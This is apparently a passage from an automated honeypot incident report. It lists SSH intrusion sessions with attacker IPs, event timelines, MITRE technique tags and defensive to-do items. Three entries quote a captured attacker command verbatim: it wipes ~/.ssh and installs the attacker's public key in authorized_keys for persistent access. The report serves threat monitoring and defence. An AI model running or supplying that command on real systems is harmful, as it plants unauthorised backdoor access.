| **First Seen** | 2026-07-17 07:59 |
| **Last Seen** | 2026-07-17 07:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:59:35` | `cowrie.session.connect` |
| `2026-07-17 07:59:36` | `cowrie.client.version` |
| `2026-07-17 07:59:36` | `cowrie.client.kex` |
| `2026-07-17 07:59:39` | `cowrie.login.success` |
| `2026-07-17 07:59:40` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.199.172[.]66` to AbuseIPDB if not already reported
- [ ] Block `221.199.172[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25a99d9e3df2

| Field | Detail |
|---|---|
| **Source IP** | `106.245.246[.]26` |
| **First Seen** | 2026-07-17 07:59 |
| **Last Seen** | 2026-07-17 07:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:59:45` | `cowrie.session.connect` |
| `2026-07-17 07:59:46` | `cowrie.client.version` |
| `2026-07-17 07:59:46` | `cowrie.client.kex` |
| `2026-07-17 07:59:48` | `cowrie.login.success` |
| `2026-07-17 07:59:49` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.245.246[.]26` to AbuseIPDB if not already reported
- [ ] Block `106.245.246[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10f7eb3cc857

| Field | Detail |
|---|---|
| **Source IP** | `178.128.183[.]16` |
| **First Seen** | 2026-07-17 08:00 |
| **Last Seen** | 2026-07-17 08:01 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:00:49` | `cowrie.session.connect` |
| `2026-07-17 08:00:49` | `cowrie.client.version` |
| `2026-07-17 08:00:49` | `cowrie.client.kex` |
| `2026-07-17 08:00:49` | `cowrie.login.success` |
| `2026-07-17 08:01:16` | `cowrie.session.file_upload` |
| `2026-07-17 08:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.183[.]16` to AbuseIPDB if not already reported
- [ ] Block `178.128.183[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-395763fd1ce9

| Field | Detail |
|---|---|
| **Source IP** | `91.230.168[.]252` |
| **First Seen** | 2026-07-17 08:03 |
| **Last Seen** | 2026-07-17 08:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 3 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:03:25` | `cowrie.session.connect` |
| `2026-07-17 08:03:25` | `cowrie.login.success` |
| `2026-07-17 08:03:25` | `cowrie.login.success` |
| `2026-07-17 08:03:25` | `cowrie.login.success` |
| `2026-07-17 08:03:26` | `cowrie.session.params` |
| `2026-07-17 08:03:26` | `cowrie.log.closed` |
| `2026-07-17 08:03:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.230.168[.]252` to AbuseIPDB if not already reported
- [ ] Block `91.230.168[.]252` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aef5eafe509

| Field | Detail |
|---|---|
| **Source IP** | `117.205.2[.]250` |
| **First Seen** | 2026-07-17 08:06 |
| **Last Seen** | 2026-07-17 08:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:06:05` | `cowrie.session.connect` |
| `2026-07-17 08:06:06` | `cowrie.client.version` |
| `2026-07-17 08:06:06` | `cowrie.client.kex` |
| `2026-07-17 08:06:08` | `cowrie.login.success` |
| `2026-07-17 08:06:09` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.205.2[.]250` to AbuseIPDB if not already reported
- [ ] Block `117.205.2[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9628ace13e55

| Field | Detail |
|---|---|
| **Source IP** | `179.185.1[.]97` |
| **First Seen** | 2026-07-17 08:06 |
| **Last Seen** | 2026-07-17 08:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:06:14` | `cowrie.session.connect` |
| `2026-07-17 08:06:14` | `cowrie.client.version` |
| `2026-07-17 08:06:14` | `cowrie.client.kex` |
| `2026-07-17 08:06:16` | `cowrie.login.success` |
| `2026-07-17 08:06:17` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.1[.]97` to AbuseIPDB if not already reported
- [ ] Block `179.185.1[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7044f69ddf29

| Field | Detail |
|---|---|
| **Source IP** | `62.122.195[.]14` |
| **First Seen** | 2026-07-17 08:09 |
| **Last Seen** | 2026-07-17 08:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:09:21` | `cowrie.session.connect` |
| `2026-07-17 08:09:21` | `cowrie.client.version` |
| `2026-07-17 08:09:21` | `cowrie.client.kex` |
| `2026-07-17 08:09:22` | `cowrie.login.success` |
| `2026-07-17 08:09:23` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:09:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.122.195[.]14` to AbuseIPDB if not already reported
- [ ] Block `62.122.195[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-535ac1de51cf

| Field | Detail |
|---|---|
| **Source IP** | `217.52.226[.]144` |
| **First Seen** | 2026-07-17 08:09 |
| **Last Seen** | 2026-07-17 08:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:09:32` | `cowrie.session.connect` |
| `2026-07-17 08:09:32` | `cowrie.client.version` |
| `2026-07-17 08:09:32` | `cowrie.client.kex` |
| `2026-07-17 08:09:33` | `cowrie.login.success` |
| `2026-07-17 08:09:34` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.52.226[.]144` to AbuseIPDB if not already reported
- [ ] Block `217.52.226[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6ea3642edb5

| Field | Detail |
|---|---|
| **Source IP** | `223.100.248[.]64` |
| **First Seen** | 2026-07-17 08:13 |
| **Last Seen** | 2026-07-17 08:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:13:33` | `cowrie.session.connect` |
| `2026-07-17 08:13:33` | `cowrie.client.version` |
| `2026-07-17 08:13:33` | `cowrie.client.kex` |
| `2026-07-17 08:13:36` | `cowrie.login.success` |
| `2026-07-17 08:13:36` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:13:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.100.248[.]64` to AbuseIPDB if not already reported
- [ ] Block `223.100.248[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15e859fd9bbc

| Field | Detail |
|---|---|
| **Source IP** | `35.207.202[.]141` |
| **First Seen** | 2026-07-17 08:15 |
| **Last Seen** | 2026-07-17 08:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:15:31` | `cowrie.session.connect` |
| `2026-07-17 08:15:31` | `cowrie.client.version` |
| `2026-07-17 08:15:32` | `cowrie.client.kex` |
| `2026-07-17 08:15:33` | `cowrie.login.success` |
| `2026-07-17 08:15:34` | `cowrie.session.params` |
| `2026-07-17 08:15:34` | `cowrie.command.input` |
| `2026-07-17 08:15:34` | `cowrie.command.failed` |
| `2026-07-17 08:15:34` | `cowrie.log.closed` |
| `2026-07-17 08:15:35` | `cowrie.session.params` |
| `2026-07-17 08:15:35` | `cowrie.command.input` |
| `2026-07-17 08:15:35` | `cowrie.session.file_download` |
| `2026-07-17 08:15:35` | `cowrie.log.closed` |
| `2026-07-17 08:15:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.207.202[.]141` to AbuseIPDB if not already reported
- [ ] Block `35.207.202[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f88e4b3fd249

| Field | Detail |
|---|---|
| **Source IP** | `35.207.202[.]141` |
| **First Seen** | 2026-07-17 08:15 |
| **Last Seen** | 2026-07-17 08:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:15:36` | `cowrie.session.connect` |
| `2026-07-17 08:15:36` | `cowrie.client.version` |
| `2026-07-17 08:15:36` | `cowrie.client.kex` |
| `2026-07-17 08:15:37` | `cowrie.login.success` |
| `2026-07-17 08:15:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.207.202[.]141` to AbuseIPDB if not already reported
- [ ] Block `35.207.202[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f480f452036

| Field | Detail |
|---|---|
| **Source IP** | `35.207.202[.]141` |
| **First Seen** | 2026-07-17 08:15 |
| **Last Seen** | 2026-07-17 08:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:15:37` | `cowrie.session.connect` |
| `2026-07-17 08:15:37` | `cowrie.client.version` |
| `2026-07-17 08:15:38` | `cowrie.client.kex` |
| `2026-07-17 08:15:39` | `cowrie.login.success` |
| `2026-07-17 08:15:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.207.202[.]141` to AbuseIPDB if not already reported
- [ ] Block `35.207.202[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83ae6ab41057

| Field | Detail |
|---|---|
| **Source IP** | `45.4.179[.]4` |
| **First Seen** | 2026-07-17 08:15 |
| **Last Seen** | 2026-07-17 08:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:15:43` | `cowrie.session.connect` |
| `2026-07-17 08:15:43` | `cowrie.client.version` |
| `2026-07-17 08:15:43` | `cowrie.client.kex` |
| `2026-07-17 08:15:44` | `cowrie.login.success` |
| `2026-07-17 08:15:45` | `cowrie.session.params` |
| `2026-07-17 08:15:45` | `cowrie.command.input` |
| `2026-07-17 08:15:45` | `cowrie.command.failed` |
| `2026-07-17 08:15:45` | `cowrie.log.closed` |
| `2026-07-17 08:15:46` | `cowrie.session.params` |
| `2026-07-17 08:15:46` | `cowrie.command.input` |
| `2026-07-17 08:15:46` | `cowrie.session.file_download` |
| `2026-07-17 08:15:46` | `cowrie.log.closed` |
| `2026-07-17 08:15:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.4.179[.]4` to AbuseIPDB if not already reported
- [ ] Block `45.4.179[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75ce5d68e2db

| Field | Detail |
|---|---|
| **Source IP** | `45.4.179[.]4` |
| **First Seen** | 2026-07-17 08:15 |
| **Last Seen** | 2026-07-17 08:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:15:46` | `cowrie.session.connect` |
| `2026-07-17 08:15:46` | `cowrie.client.version` |
| `2026-07-17 08:15:46` | `cowrie.client.kex` |
| `2026-07-17 08:15:47` | `cowrie.login.success` |
| `2026-07-17 08:15:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.4.179[.]4` to AbuseIPDB if not already reported
- [ ] Block `45.4.179[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1877dc23a1a

| Field | Detail |
|---|---|
| **Source IP** | `45.4.179[.]4` |
| **First Seen** | 2026-07-17 08:15 |
| **Last Seen** | 2026-07-17 08:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:15:47` | `cowrie.session.connect` |
| `2026-07-17 08:15:47` | `cowrie.client.version` |
| `2026-07-17 08:15:47` | `cowrie.client.kex` |
| `2026-07-17 08:15:47` | `cowrie.login.success` |
| `2026-07-17 08:15:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.4.179[.]4` to AbuseIPDB if not already reported
- [ ] Block `45.4.179[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a51024b2ddd5

| Field | Detail |
|---|---|
| **Source IP** | `203.110.233[.]225` |
| **First Seen** | 2026-07-17 08:16 |
| **Last Seen** | 2026-07-17 08:17 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:16:58` | `cowrie.session.connect` |
| `2026-07-17 08:17:00` | `cowrie.client.version` |
| `2026-07-17 08:17:00` | `cowrie.client.kex` |
| `2026-07-17 08:17:05` | `cowrie.login.success` |
| `2026-07-17 08:17:05` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:17:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.110.233[.]225` to AbuseIPDB if not already reported
- [ ] Block `203.110.233[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af2c72ad9b34

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-07-17 08:17 |
| **Last Seen** | 2026-07-17 08:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:17:15` | `cowrie.session.connect` |
| `2026-07-17 08:17:16` | `cowrie.client.version` |
| `2026-07-17 08:17:16` | `cowrie.client.kex` |
| `2026-07-17 08:17:19` | `cowrie.login.success` |
| `2026-07-17 08:17:20` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34ee650edd83

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]58` |
| **First Seen** | 2026-07-17 08:17 |
| **Last Seen** | 2026-07-17 08:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:17:40` | `cowrie.session.connect` |
| `2026-07-17 08:17:40` | `cowrie.client.version` |
| `2026-07-17 08:17:40` | `cowrie.client.kex` |
| `2026-07-17 08:17:40` | `cowrie.login.success` |
| `2026-07-17 08:17:41` | `cowrie.session.params` |
| `2026-07-17 08:17:41` | `cowrie.command.input` |
| `2026-07-17 08:17:41` | `cowrie.command.failed` |
| `2026-07-17 08:17:41` | `cowrie.log.closed` |
| `2026-07-17 08:17:42` | `cowrie.session.params` |
| `2026-07-17 08:17:42` | `cowrie.command.input` |
| `2026-07-17 08:17:42` | `cowrie.session.file_download` |
| `2026-07-17 08:17:42` | `cowrie.log.closed` |
| `2026-07-17 08:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]58` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9e691cb0318

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]58` |
| **First Seen** | 2026-07-17 08:17 |
| **Last Seen** | 2026-07-17 08:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:17:42` | `cowrie.session.connect` |
| `2026-07-17 08:17:42` | `cowrie.client.version` |
| `2026-07-17 08:17:42` | `cowrie.client.kex` |
| `2026-07-17 08:17:43` | `cowrie.login.success` |
| `2026-07-17 08:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]58` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca23c96c3464

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]58` |
| **First Seen** | 2026-07-17 08:17 |
| **Last Seen** | 2026-07-17 08:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:17:43` | `cowrie.session.connect` |
| `2026-07-17 08:17:43` | `cowrie.client.version` |
| `2026-07-17 08:17:43` | `cowrie.client.kex` |
| `2026-07-17 08:17:43` | `cowrie.login.success` |
| `2026-07-17 08:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]58` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce5ed2d70595

| Field | Detail |
|---|---|
| **Source IP** | `172.235.41[.]245` |
| **First Seen** | 2026-07-17 08:23 |
| **Last Seen** | 2026-07-17 08:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:23:00` | `cowrie.session.connect` |
| `2026-07-17 08:23:00` | `cowrie.login.success` |
| `2026-07-17 08:23:01` | `cowrie.session.params` |
| `2026-07-17 08:23:01` | `cowrie.command.input` |
| `2026-07-17 08:23:01` | `cowrie.command.input` |
| `2026-07-17 08:23:01` | `cowrie.command.failed` |
| `2026-07-17 08:23:01` | `cowrie.command.input` |
| `2026-07-17 08:23:01` | `cowrie.command.failed` |
| `2026-07-17 08:23:01` | `cowrie.command.input` |
| `2026-07-17 08:23:01` | `cowrie.log.closed` |
| `2026-07-17 08:23:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.235.41[.]245` to AbuseIPDB if not already reported
- [ ] Block `172.235.41[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f59fe92e18bd

| Field | Detail |
|---|---|
| **Source IP** | `50.217.40[.]11` |
| **First Seen** | 2026-07-17 08:26 |
| **Last Seen** | 2026-07-17 08:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:26:20` | `cowrie.session.connect` |
| `2026-07-17 08:26:21` | `cowrie.client.version` |
| `2026-07-17 08:26:21` | `cowrie.client.kex` |
| `2026-07-17 08:26:22` | `cowrie.login.success` |
| `2026-07-17 08:26:23` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.40[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.217.40[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0a342c76f26

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 08:27 |
| **Last Seen** | 2026-07-17 08:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:27:18` | `cowrie.session.connect` |
| `2026-07-17 08:27:18` | `cowrie.client.version` |
| `2026-07-17 08:27:18` | `cowrie.client.kex` |
| `2026-07-17 08:27:18` | `cowrie.login.success` |
| `2026-07-17 08:27:19` | `cowrie.session.params` |
| `2026-07-17 08:27:19` | `cowrie.command.input` |
| `2026-07-17 08:27:19` | `cowrie.log.closed` |
| `2026-07-17 08:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dd5c4300d31

| Field | Detail |
|---|---|
| **Source IP** | `200.37.179[.]83` |
| **First Seen** | 2026-07-17 08:27 |
| **Last Seen** | 2026-07-17 08:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
